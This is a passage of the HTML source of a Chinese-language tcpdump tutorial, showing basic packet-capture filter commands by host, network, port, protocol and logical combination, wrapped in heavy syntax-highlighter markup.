crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ tcpdump -r packets_file</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634b9eedf47376056104-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634b9eedf47376056104-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tcpdump</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">r</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">packets_file</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h2 id=\"toc_10\">获取更多的包信息，并且以可读的形式显示时间戳</h2>\n<p>要获取更多的包信息同时以可读的形式显示时间戳，使用：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634b9eedf4a574966801\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" touchscreen minimize scroll-mouseover\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ tcpdump -ttttnnvvS</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634b9eedf4a574966801-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634b9eedf4a574966801-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tcpdump</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">ttttnnvvS</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h2 id=\"toc_11\">查看整个网络的数据包</h2>\n<p>要获取整个网络的数据包，在终端执行下面命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634b9eedf4d982411286\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" touchscreen minimize scroll-mouseover\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ tcpdump net 192.168.1.0/24</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634b9eedf4d982411286-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634b9eedf4d982411286-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tcpdump </span><span class=\"crayon-i\">net</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.1.0</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">24</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h2 id=\"toc_12\">根据 IP 地址查看报文</h2>\n<p>要获取指定 IP 的数据包，不管是作为源地址还是目的地址，使用下面命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634b9eedf50790008087\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" touchscreen minimize scroll-mouseover\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ tcpdump host 192.168.1.100</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634b9eedf50790008087-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634b9eedf50790008087-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tcpdump </span><span class=\"crayon-i\">host</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.1.100</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>要指定 IP 地址是源地址或是目的地址则使用：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634b9eedf53216888353\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" touchscreen minimize scroll-mouseover\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ tcpdump src 192.168.1.100\r\n$ tcpdump dst 192.168.1.100</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634b9eedf53216888353-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634b9eedf53216888353-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634b9eedf53216888353-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tcpdump </span><span class=\"crayon-i\">src</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.1.100</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634b9eedf53216888353-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tcpdump </span><span class=\"crayon-i\">dst</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.1.100</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p>\n<h2 id=\"toc_13\">查看某个协议或端口号的数据包</h2>\n<p>要查看某个协议的数据包，运行下面命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634b9eedf57337232830\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" touchscreen minimize scroll-mouseover\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ tcpdump ssh</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634b9eedf57337232830-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634b9eedf57337232830-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tcpdump </span><span class=\"crayon-v\">ssh</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>要捕获某个端口或一个范围的数据包，使用：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634b9eedf5a252217217\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" touchscreen minimize scroll-mouseover\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ tcpdump port 22\r\n$ tcpdump portrange 22-125</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634b9eedf5a252217217-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634b9eedf5a252217217-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634b9eedf5a252217217-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tcpdump </span><span class=\"crayon-i\">port</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">22</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634b9eedf5a252217217-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tcpdump </span><span class=\"crayon-i\">portrange</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">22</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">125</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>我们也可以与 <code>src</code> 和 <code>dst</code> 选项连用来捕获指定源端口或指定目的端口的报文。</p>\n<p>我们还可以使用“与” （<code>and</code>，<code>&amp;&amp;</code>）、“或” （<code>or</code>，<code>||</code> ) 和“非”（<code>not</code>，<code>!</code>） 来将两个条件组合起来。当我们需要基于某些条件来分析网络报文是非常有用。</p>\n<h2 id=\"toc_14\">使用“与”</h2>\n<p>可以使用 <code>and</code> 或者符号 <code>&amp;&amp;</code> 来将两个或多个条件组合起来。比如：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634b9eedf5e269473362\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" touchscreen minimize scroll-mouseover\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ tcpdump src 192.168.1.100 &amp;&amp; port 22 -w ssh_packets</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634b9eedf5e269473362-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634b9eedf5e269473362-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tcpdump </span><span class=\"crayon-i\">src</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.1.100</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">port</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">22</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">w</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ssh_packets</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p></p>\n<h2 id=\"toc_15\">使用“或”</h2>\n<p>“或”会检查是否匹配命令所列条件中的其中一条，像这样：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634b9eedf61758793004\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" touchscreen minimize scroll-mouseover\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ tcpdump src 192.168.1.100 or dst 192.168.1.50 &amp;&amp; port 22 -w ssh_packets\r\n$ tcpdump port 443 or 80 -w http_packets</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634b9eedf61758793004-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634b9eedf61758793004-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634b9eedf61758793004-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tcpdump </span><span class=\"crayon-i\">src</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.1.100</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">dst</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.1.50</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">port</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">22</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">w</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ssh</span><span class=\"crayon-sy\">_</span>packets</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634b9eedf61758793004-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tcpdump </span><span class=\"crayon-i\">port</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">443</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">80</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">w</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">http_packets</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p></p>\n<h2 id=\"toc_16\">使用“非”</h2>\n<p>当我们想表达不匹配某项条件时可以使用“非”，像这样：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634b9eedf64745256553\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" touchscreen minimize scroll-mouseover\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button 